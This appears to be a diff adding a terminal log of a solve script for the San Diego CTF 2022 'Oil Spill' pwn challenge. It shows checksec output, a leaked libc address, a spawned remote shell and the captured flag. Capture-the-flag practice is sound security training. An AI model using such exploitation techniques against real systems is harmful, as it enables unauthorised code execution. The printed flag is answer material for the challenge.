@@ -1,0 +1,25 @@
+mito@ubuntu:~/CTF/San_Diego_CTF_2022/Pwn_Oil_Spill$ python solve.py r
+[*] '/home/mito/CTF/San_Diego_CTF_2022/Pwn_Oil_Spill/OilSpill'
+    Arch:     amd64-64-little
+    RELRO:    No RELRO
+    Stack:    Canary found
+    NX:       NX enabled
+    PIE:      No PIE (0x400000)
+[+] Opening connection to oil.sdc.tf on port 1337: Done
+[*] '/lib/x86_64-linux-gnu/libc.so.6'
+    Arch:     amd64-64-little
+    RELRO:    Partial RELRO
+    Stack:    Canary found
+    NX:       NX enabled
+    PIE:      PIE enabled
+puts_addr = 0x7fbb3ac93970
+libc_base = 0x7fbb3ac13000
+
+                                   $ id
+uid=1000(user) gid=1000(user) groups=1000(user)
+$ ls -l
+total 12
+-rwxr-xr-x 1 nobody nogroup 7728 May  5 21:58 OilSpill
+-rw-r--r-- 1 nobody nogroup   34 Apr 29 18:41 flag.txt
+$ cat flag.txt
+sdctf{th4nks_f0r_S4V1nG_tH3_duCk5}
